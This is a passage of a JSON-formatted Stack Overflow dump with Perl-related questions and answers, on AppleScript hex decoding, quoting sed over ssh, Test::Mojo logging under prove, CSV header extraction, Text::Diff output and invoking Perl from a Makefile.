to regular text in Apple Script", "body": "<p>I'm using the todo list app <em>Things</em> from <em>Cultured Code</em> on my Mac and when I copy a link to a task to clipboard it ends up encoded as HEX code in the clipboard. No problem when I paste it into a text file \u2013 it then shows as decoded text.</p>\n\n<p>But, I need to use the clipboard content in an AppleScript and have difficulties decoding it to plain text there.</p>\n\n<p>I have tried multiple subroutines but they did not work in my case. Most examples that I found online deal with simple encoded URLs. And the code that I have so far works to decode for example \"0348\" correctly to the number 1000 but my script <strong>cannot</strong> decode the encoded Things link (that long line of numbers at the top).</p>\n\n<p>Can somebody help me please?</p>\n\n<p>Here's what I have so far:</p>\n\n<pre><code>-- The link to a task in THINGS, encoded: 7468696e67733a2f2f2f73686f773f69643d41463645303746462d394230462d343539332d423143332d313846303337434237363836\n-- Above link to the task in THINGS, unencoded: things:///show?id=AF6E07FF-9B0F-4593-B1C3-18F037CB7686\n-- Online converter: http://www.unit-conversion.info/texttools/hexadecimal/\n-- Number 1000 encoded: 03E8\n\nset theEncodedText to \"03E8\"\nset theDecodedText to (do shell script \"perl -e 'printf(hex(\\\"\" &amp; theEncodedText &amp; \"\\\"))'\") as string\n\nset theDisplayedText to theDecodedText\ndisplay dialog theDisplayedText\n</code></pre>\n\n<p>Thank you,\nMartin</p>\n"}, {"tags": ["bash", "perl", "unix", "sed"], "comments": [{"owner": {"reputation": 658023, "user_id": 548225, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/dab08478b226280d4a30894c9a7ed719?s=128&d=identicon&r=PG", "display_name": "anubhava", "link": "https://stackoverflow.com/users/548225/anubhava"}, "edited": false, "score": 3, "creation_date": 1520545054, "post_id": 49182820, "comment_id": 85371490, "body": "perl can handle this, why call <code>sed</code>?"}, {"owner": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 1, "creation_date": 1520545099, "post_id": 49182820, "comment_id": 85371518, "body": "may be, <code>my $sed_cmd=quotemeta(&#39;sed -n &quot;&#47;&#39;.$last_hour.&#39;&#47;,\\$p&quot;&#39;)</code>?"}, {"owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "edited": false, "score": 3, "creation_date": 1520545200, "post_id": 49182820, "comment_id": 85371569, "body": "guys, he&#39;s sending the sed command to a remote host using ssh. Chill."}, {"owner": {"reputation": 5970, "user_id": 2618323, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/3Czph.jpg?s=128&g=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/2618323/developer"}, "reply_to_user": {"reputation": 658023, "user_id": 548225, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/dab08478b226280d4a30894c9a7ed719?s=128&d=identicon&r=PG", "display_name": "anubhava", "link": "https://stackoverflow.com/users/548225/anubhava"}, "edited": false, "score": 0, "creation_date": 1520545210, "post_id": 49182820, "comment_id": 85371578, "body": "@anubhava , could you please suggest how we can do this from perl instead of using sed . I want to grep all those lines which are printed in last hour"}, {"owner": {"reputation": 5970, "user_id": 2618323, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/3Czph.jpg?s=128&g=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/2618323/developer"}, "reply_to_user": {"reputation": 2010, "user_id": 6499160, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a483ab21be9d3892e9b29047b1b3afb1?s=128&d=identicon&r=PG&f=1", "display_name": "wolfrevokcats", "link": "https://stackoverflow.com/users/6499160/wolfrevokcats"}, "edited": false, "score": 0, "creation_date": 1520547233, "post_id": 49182820, "comment_id": 85372582, "body": "@wolfrevokcats quotemeta worked for me"}], "answers": [{"tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": true, "score": 1, "last_activity_date": 1520546663, "creation_date": 1520546663, "answer_id": 49183244, "question_id": 49182820, "link": "https://stackoverflow.com/questions/49182820/sed-command-in-perl-script/49183244#49183244", "title": "Sed command in perl script", "body": "<p>I think you're running into a bit of quoting hell with the backticks, where you need to concatenate the ssh command and all its arguments into a string to send to sh. I'd suggest this, where each component of the ssh command is a separate word:</p>\n\n<pre><code>use autodie;\n\nmy @ssh_cmd = ('ssh', $remote_addr, 'sed', '-n', \"/$last_hour/,\\\\\\$p\", \"$dir/$remote_filename\");\nopen my $pipe, '-|', @ssh_cmd;\nmy $outstr = join '', &lt;$pipe&gt;;\nclose $pipe;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "is_accepted": false, "score": 2, "last_activity_date": 1520667493, "creation_date": 1520667493, "answer_id": 49206558, "question_id": 49182820, "link": "https://stackoverflow.com/questions/49182820/sed-command-in-perl-script/49206558#49206558", "title": "Sed command in perl script", "body": "<p>You could use <a href=\"https://metacpan.org/pod/Net::OpenSSH\" rel=\"nofollow noreferrer\">Net::OpenSSH</a>. It would take care of doing the <a href=\"https://metacpan.org/pod/Net::OpenSSH#Shell-quoting\" rel=\"nofollow noreferrer\">shell escaping</a> automatically:</p>\n\n<pre><code>my $ssh = Net::OpenSSH-&gt;new($remote_addr);\nmy $outstr = $ssh-&gt;capture('sed', '-n', \"/$last_hour/,\\$p\", \"$dir/$remote_file\");\n</code></pre>\n\n<p>BTW, reading a 25Gb file just to get some lines from the end may be inefficient and generate an appreciable IO load. Maybe you could use <a href=\"http://man7.org/linux/man-pages/man1/tac.1.html\" rel=\"nofollow noreferrer\">tac</a> which reads the file lines in reverse order:</p>\n\n<pre><code>my $ssh = Net::OpenSSH-&gt;new($remote_addr);\nmy $fh = $ssh-&gt;pipe_out('tac', \"$dir/$remote_file\");\nmy @out;\nwhile (&lt;$fh&gt;) {\n    /$last_hour/ or last; # you may need to adjust this\n                          # stop condition!\n    unshift @out, $_;\n}\nclose($fh);\n</code></pre>\n"}], "owner": {"reputation": 5970, "user_id": 2618323, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/3Czph.jpg?s=128&g=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/2618323/developer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 786, "favorite_count": 0, "accepted_answer_id": 49183244, "answer_count": 2, "score": 1, "last_activity_date": 1520667493, "creation_date": 1520544753, "question_id": 49182820, "link": "https://stackoverflow.com/questions/49182820/sed-command-in-perl-script", "title": "Sed command in perl script", "body": "<p>I am trying to use sed command from my Perl script. I have to get the data of last hour from a file which is 25GB , but when i am running the same command from terminal it is working fine but the same command is not working from Perl script. System variable which i am using , that is causing the issue i think , don't know how to handle :</p>\n\n<pre><code>my $sed_cmd = 'sed -n \"/'.$last_hour.'/,\\$p\"';\nmy $outstr=`ssh $remote_addr $sed_cmd  $dir/$remote_filename`;\n</code></pre>\n\n<p>Above command is getting converted like this : <code>sed -n \"/15:12:24/,\\$p\"</code> and from perl script this not working.\nBut actually this command is working from terminal :  <code>sed -n \"/15:09:40/,\\$p\"</code> file</p>\n\n<p>the only diffrence is when i am calling this sed command with ssh i am geting error otherwise it is working fine . Could you please suggest what is the issue</p>\n"}, {"tags": ["perl", "mojolicious-lite"], "answers": [{"comments": [{"owner": {"reputation": 34304, "user_id": 1733163, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/gmGvj.jpg?s=128&g=1", "display_name": "Miller", "link": "https://stackoverflow.com/users/1733163/miller"}, "edited": false, "score": 0, "creation_date": 1520545240, "post_id": 49182334, "comment_id": 85371593, "body": "You are correct in that the prove -v changes the MOJO_LOG_LEVEL from fatal to debug.   I&#39;m somewhat surprised that that leads to &quot;duplicate&quot; logging though.  I was expecting that the &quot;on message&quot; trigger would override the other logging streams, but that doesn&#39;t appear to be the case."}, {"owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "reply_to_user": {"reputation": 34304, "user_id": 1733163, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/gmGvj.jpg?s=128&g=1", "display_name": "Miller", "link": "https://stackoverflow.com/users/1733163/miller"}, "edited": false, "score": 0, "creation_date": 1520548282, "post_id": 49182334, "comment_id": 85373029, "body": "That might arguably be a bug \u2013 you could perhaps inquire on the #mojo channel?"}], "tags": [], "owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "is_accepted": true, "score": 6, "last_activity_date": 1520542788, "creation_date": 1520542788, "answer_id": 49182334, "question_id": 49181826, "link": "https://stackoverflow.com/questions/49181826/testmojo-prove-leads-to-duplicate-logging/49182334#49182334", "title": "Test::Mojo + prove leads to duplicate logging", "body": "<p>The prove testrunner uses the <code>TAP::Harness</code> infrastructure. When you run <code>prove -v</code>, this will set the <code>HARNESS_IS_VERBOSE</code> environment variable.</p>\n\n<p>Then, Mojo::Test picks up this environment variable:</p>\n\n<pre><code># Silent or loud tests\n$ENV{MOJO_LOG_LEVEL} ||= $ENV{HARNESS_IS_VERBOSE} ? 'debug' : 'fatal';\n</code></pre>\n\n<p>You therefore get Mojo's debug log messages when running <code>prove -v</code>.</p>\n\n<p>It seems that manually setting the MOJO_LOG_LEVEL env variable is the best approach if you do not want this output.</p>\n"}], "owner": {"reputation": 34304, "user_id": 1733163, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/gmGvj.jpg?s=128&g=1", "display_name": "Miller", "link": "https://stackoverflow.com/users/1733163/miller"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 49182334, "answer_count": 1, "score": 5, "last_activity_date": 1520542788, "creation_date": 1520540632, "question_id": 49181826, "link": "https://stackoverflow.com/questions/49181826/testmojo-prove-leads-to-duplicate-logging", "title": "Test::Mojo + prove leads to duplicate logging", "body": "<p>I have the following test script that utilizes Test::Mojo.  When I run it from the command line using perl, it outputs correctly.  However, when I run it through \"prove -v\", the Mojo logging is duplicated and one of them isn't piped through \"on message\".</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nuse Test::More tests =&gt; 1;\n\nuse Mojolicious::Lite;\nuse Test::Mojo;\n\napp-&gt;log-&gt;on(\n    message =&gt; sub {\n        my ( $log, $level, @lines ) = @_;\n        note \"MojoLog $level: @lines\";\n    }\n);\n\nget '/debug/mojo/req_url' =&gt; sub {\n    my $c = shift;\n\n    $c-&gt;render( text =&gt; $c-&gt;req-&gt;url );\n};\n\nsubtest 'Mojo - $c-&gt;req-&gt;url' =&gt; sub {\n    plan tests =&gt; 3;\n\n    my $t = Test::Mojo-&gt;new;\n\n    $t-&gt;get_ok('/debug/mojo/req_url')    #\n        -&gt;status_is(200)                 #\n        -&gt;content_is('/debug/mojo/req_url');\n};\n</code></pre>\n\n<p>The output when run directly:</p>\n\n<pre><code>$ perl dup_logging.t\n1..1\n# Subtest: Mojo - $c-&gt;req-&gt;url\n    1..3\n    # MojoLog debug: GET \"/debug/mojo/req_url\"\n    # MojoLog debug: Routing to a callback\n    # MojoLog debug: 200 OK (0.000797s, 1254.705/s)\n    ok 1 - GET /debug/mojo/req_url\n    ok 2 - 200 OK\n    ok 3 - exact match for content\nok 1 - Mojo - $c-&gt;req-&gt;url\n</code></pre>\n\n<p>And the output when run through prove:</p>\n\n<pre><code>$ prove -v dup_logging.t\ndup_logging.t ..\n1..1\n# Subtest: Mojo - $c-&gt;req-&gt;url\n    1..3\n[Thu Mar  8 12:16:35 2018] [debug] GET \"/debug/mojo/req_url\"\n    # MojoLog debug: GET \"/debug/mojo/req_url\"\n[Thu Mar  8 12:16:35 2018] [debug] Routing to a callback\n    # MojoLog debug: Routing to a callback\n[Thu Mar  8 12:16:35 2018] [debug] 200 OK (0.000842s, 1187.648/s)\n    # MojoLog debug: 200 OK (0.000842s, 1187.648/s)\n    ok 1 - GET /debug/mojo/req_url\n    ok 2 - 200 OK\n    ok 3 - exact match for content\nok 1 - Mojo - $c-&gt;req-&gt;url\nok\nAll tests successful.\nFiles=1, Tests=1,  1 wallclock secs ( 0.03 usr  0.01 sys +  0.34 cusr  0.03 csys =  0.41 CPU)\nResult: PASS\n</code></pre>\n\n<p>The following is my version information:</p>\n\n<pre><code>$ perl -MMojolicious -E 'say Mojolicious-&gt;VERSION'\n7.14\n$ prove --version\nTAP::Harness v3.36 and Perl v5.16.3\n</code></pre>\n\n<p>I discovered that one way to avoid this problem is to set the MOJO_LOG_LEVEL environment variable at the top of the script.</p>\n\n<pre><code>$ENV{MOJO_LOG_LEVEL} = 'fatal';\n</code></pre>\n\n<p>Any other suggestions on how to get prove and Test::Mojo to play well together with regard to the logging?  </p>\n"}, {"tags": ["windows", "perl", "powershell", "cmd", "header"], "comments": [{"owner": {"reputation": 33567, "user_id": 1358, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c5f10d1a484dac4a364246bf9f410e9b?s=128&d=identicon&r=PG", "display_name": "EBGreen", "link": "https://stackoverflow.com/users/1358/ebgreen"}, "edited": false, "score": 0, "creation_date": 1520539194, "post_id": 49181424, "comment_id": 85368531, "body": "(Get-Content book1.csv)[0] &gt; book3.csv"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1520540310, "post_id": 49181424, "comment_id": 85369081, "body": "Why is this question tagged <a href=\"https://stackoverflow.com/questions/tagged/perl\">perl</a>?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1520540791, "post_id": 49181424, "comment_id": 85369333, "body": "@MattJacob: I was wondering the same, so I replied."}, {"owner": {"reputation": 33567, "user_id": 1358, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c5f10d1a484dac4a364246bf9f410e9b?s=128&d=identicon&r=PG", "display_name": "EBGreen", "link": "https://stackoverflow.com/users/1358/ebgreen"}, "edited": false, "score": 0, "creation_date": 1520541222, "post_id": 49181424, "comment_id": 85369544, "body": "I think the user wants someone to give him the code for any of those lnguages."}], "answers": [{"tags": [], "owner": {"reputation": 30007, "user_id": 3245749, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xYDwR.jpg?s=128&g=1", "display_name": "TheMadTechnician", "link": "https://stackoverflow.com/users/3245749/themadtechnician"}, "is_accepted": true, "score": 1, "last_activity_date": 1520539784, "creation_date": 1520539784, "answer_id": 49181643, "question_id": 49181424, "link": "https://stackoverflow.com/questions/49181424/how-to-get-the-header-from-a-csv-file-and-write-it-to-another-file/49181643#49181643", "title": "How to get the header from a CSV file and write it to another file?", "body": "<p>If you are running powershell you should be able to use the <code>-TotalCount</code> (aliases <code>-Head</code> and <code>-First</code>) parameter of <code>Get-Content</code> (alias <code>GC</code>) to just get the first line of a file.</p>\n\n<pre><code>gc book1.csv -head 1|sc book3.csv\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1520540692, "creation_date": 1520540692, "answer_id": 49181841, "question_id": 49181424, "link": "https://stackoverflow.com/questions/49181424/how-to-get-the-header-from-a-csv-file-and-write-it-to-another-file/49181841#49181841", "title": "How to get the header from a CSV file and write it to another file?", "body": "<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nuse Text::CSV_XS;\n\nmy $csv = 'Text::CSV_XS'-&gt;new({binary =&gt; 1, escape_char =&gt; '\\\\'});\nopen my $fh, '&lt;', 'book1.csv' or die $!;\nmy $h = $csv-&gt;getline($fh);\n\nmy $out = 'Text::CSV_XS'-&gt;new({eol =&gt; $/, escape_char =&gt; '\\\\'});\nopen my $fho, '&gt;', 'book3.csv' or die $!;\n$out-&gt;say($fho, $h);\n</code></pre>\n\n<p>Tested with</p>\n\n<pre><code>\"Header 1\",\"Header, 2\",\"Header \\\"3\\\"\",\"Header\n4\"\n1,2,3,4\n</code></pre>\n"}], "owner": {"reputation": 577, "user_id": 3352105, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f3b731a2a30492e0a990fd302d45e57d?s=128&d=identicon&r=PG&f=1", "display_name": "faujong", "link": "https://stackoverflow.com/users/3352105/faujong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 49181643, "answer_count": 2, "score": 0, "last_activity_date": 1520540692, "creation_date": 1520538894, "question_id": 49181424, "link": "https://stackoverflow.com/questions/49181424/how-to-get-the-header-from-a-csv-file-and-write-it-to-another-file", "title": "How to get the header from a CSV file and write it to another file?", "body": "<p>How can I get the header from a CSV file and write it to another file ?\nThis code works if I don't have many columns in the CSV file, but it doesn't work when my CSV file contains 200+ columns. It just echoes the column header (but not all of them, they are truncated) to the screen.</p>\n\n<pre><code>@echo off\nset /p \"header=\"&lt;book1.csv\necho %header% &gt; \"book3.csv\"\n</code></pre>\n"}, {"tags": ["windows", "perl", "cmd", "compare", "diff"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1520536411, "post_id": 49179424, "comment_id": 85367078, "body": "By the way, Beyond Compare Pro (not free, but free trial) is a great compare tool, and it specifically has an excellent CSV-compare mode."}], "answers": [{"comments": [{"owner": {"reputation": 577, "user_id": 3352105, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f3b731a2a30492e0a990fd302d45e57d?s=128&d=identicon&r=PG&f=1", "display_name": "faujong", "link": "https://stackoverflow.com/users/3352105/faujong"}, "edited": false, "score": 0, "creation_date": 1520536656, "post_id": 49179626, "comment_id": 85367181, "body": "Thank you all. The solution from ikegami works ! #!/usr/bin/env perl  use strict; use warnings;  use Text::Diff;  my $diffs = diff &#39;file1.txt&#39; =&gt; &#39;file2.txt&#39;; $diffs =~ s/^(?:[^\\n]*+\\n){2}//; $diffs =~ s/^(?:[\\@ ][^\\n]*+)?+\\n//mg;  print $diffs;  Is it possible to include the header from file1.txt in newperl.csv ? Thank you."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 577, "user_id": 3352105, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f3b731a2a30492e0a990fd302d45e57d?s=128&d=identicon&r=PG&f=1", "display_name": "faujong", "link": "https://stackoverflow.com/users/3352105/faujong"}, "edited": false, "score": 0, "creation_date": 1520583160, "post_id": 49179626, "comment_id": 85383661, "body": "@faujong: Posting code in a comment really isn&#39;t very useful :-) If you have another question, please make a new post."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1520532079, "creation_date": 1520532079, "answer_id": 49179626, "question_id": 49179424, "link": "https://stackoverflow.com/questions/49179424/using-perl-to-compare-2-large-files/49179626#49179626", "title": "Using Perl to compare 2 large files", "body": "<p>You should look at the <code>STYLE</code> option in <a href=\"https://metacpan.org/pod/Text::Diff\" rel=\"nofollow noreferrer\">the documentation for Text::Diff</a>. It's possible that one of the built-in styles might be more to your liking. But if that's not the case you could write your own formatting package. It sounds to me like you would just need to supply a <code>hunk_header()</code> method that returns an empty string (as it's the hunk header lines that you don't like).</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1520537393, "last_edit_date": 1520537393, "creation_date": 1520535226, "answer_id": 49180462, "question_id": 49179424, "link": "https://stackoverflow.com/questions/49179424/using-perl-to-compare-2-large-files/49180462#49180462", "title": "Using Perl to compare 2 large files", "body": "<p>In the unified format,</p>\n\n<ul>\n<li>The first two lines indicate the files being compared.</li>\n<li>Lines that start with \"<code>@</code>\" indicate location of the differences in the file.</li>\n<li>Lines that start with a \"<code>-</code>\" indicates a line that is only in the first file.</li>\n<li>Lines that start with a \"<code>+</code>\" indicates a line that is only in the second file.</li>\n<li>Lines that start with a space indicate a line that is in both files.</li>\n<li>The output may contain the line \"<code>\\ No newline at end of file</code>\".</li>\n<li>Every line of in the difference will be newline-terminated, even if the lines of the input aren't.</li>\n</ul>\n\n<p>Solution:</p>\n\n<pre><code>$diffs =~ s/^(?:[^\\n]*+\\n){2}//;\n$diffs =~ s/^[\\@ \\\\][^\\n]*+\\n//mg;\n</code></pre>\n\n<p>Note that adding <code>CONTEXT =&gt; 0</code> will reduce the number of lines to remove.</p>\n\n<hr>\n\n<p>That said, there's not much point in using <a href=\"http://search.cpan.org/perldoc?Text::Diff\" rel=\"nofollow noreferrer\">Text::Diff</a> if you want your own output format. You might as well use <a href=\"http://search.cpan.org/perldoc?Algorithm::Diff\" rel=\"nofollow noreferrer\">Algorithm::Diff</a> directly.</p>\n\n<pre><code>use Algorithm::Diff qw( traverse_sequences );\n\nmy $qfn1 = 'file1.txt';\nmy $qfn2 = 'file2.txt';\n\nmy @file1 = do { open(my $fh, '&lt;', $qfn1) or die(\"Can't open \\\"$qfn1\\\": $!\\n\"); &lt;$fh&gt; };\nmy @file2 = do { open(my $fh, '&lt;', $qfn2) or die(\"Can't open \\\"$qfn2\\\": $!\\n\"); &lt;$fh&gt; };\n\nif (@lines1) { chomp($lines1[-1]); $lines1[-1] .= \"\\n\"; }\nif (@lines2) { chomp($lines2[-1]); $lines2[-1] .= \"\\n\"; }\n\ntraverse_sequences(\\@lines1, \\@lines2, {\n   DISCARD_A =&gt; sub { print(\"-\", $lines1[$_[0]]); },\n   DISCARD_B =&gt; sub { print(\"+\", $lines2[$_[1]]); },\n});\n</code></pre>\n"}], "owner": {"reputation": 577, "user_id": 3352105, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/f3b731a2a30492e0a990fd302d45e57d?s=128&d=identicon&r=PG&f=1", "display_name": "faujong", "link": "https://stackoverflow.com/users/3352105/faujong"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 444, "favorite_count": 0, "accepted_answer_id": 49180462, "answer_count": 2, "score": -1, "last_activity_date": 1520537393, "creation_date": 1520531345, "last_edit_date": 1520531849, "question_id": 49179424, "link": "https://stackoverflow.com/questions/49179424/using-perl-to-compare-2-large-files", "title": "Using Perl to compare 2 large files", "body": "<p>I am comparing 2 large CSV file using Perl that's called in a batch file. \nI put the result in a 3rd file.</p>\n\n<p>Currently the file contains other information like headers, and other lines like this:</p>\n\n<pre><code>--- file1.txt   Wed Mar  7 14:57:10 2018\n+++ file2.txt   Wed Mar  7 13:56:51 2018\n@@ -85217,4 +85217,8 @@\n</code></pre>\n\n<p>How can the result file only contains the difference ?\nThank you.</p>\n\n<p>This is my perl:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict; use warnings;\nuse Text::Diff;\nmy $diffs = diff 'file1.txt' =&gt; 'file2.txt';\nprint $diffs;\n</code></pre>\n\n<p>This is my batch file:</p>\n\n<pre><code>perl diffperl.pl &gt; newperl.csv\n</code></pre>\n"}, {"tags": ["perl", "makefile"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 4, "creation_date": 1520524084, "post_id": 49177072, "comment_id": 85359479, "body": "What have you tried and how did it fail?"}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520524190, "post_id": 49177072, "comment_id": 85359546, "body": "This is my very first time i&#39;m using it in makefile, i don&#39;t know how to do it, i was trying that"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1520524319, "post_id": 49177072, "comment_id": 85359645, "body": "What&#39;s the relative path from the Makefile to the perl script? Can you call the script directly <code>&#47;path&#47;to&#47;file_read.pl</code>, or do you need to prepend <code>perl</code>?"}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1520524462, "post_id": 49177072, "comment_id": 85359749, "body": "both the files in the same place"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520524758, "post_id": 49177293, "comment_id": 85359967, "body": "i have used it directly, the script is not working. and in the script i have mentioned the shebang"}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1520524535, "creation_date": 1520524535, "answer_id": 49177293, "question_id": 49177072, "link": "https://stackoverflow.com/questions/49177072/adding-perl-script-to-makefile/49177293#49177293", "title": "adding perl script to makefile", "body": "<p>Generally, you can call <code>perl</code> with the path to the script as an argument:</p>\n\n<pre><code>test1:\n    rm -rf cov_work *.trn INCA_libs *.dsn \n    $(comp) +UVM_VERBOSITY=UVM_MEDIUM +UVM_TESTNAME=wr_rd_all_registers\n    perl ./file_read.pl\n</code></pre>\n\n<p>If your script is executable and its shebang points to a valid Perl interpreter, you can even just use</p>\n\n<pre><code>    ./file_read.pl\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": 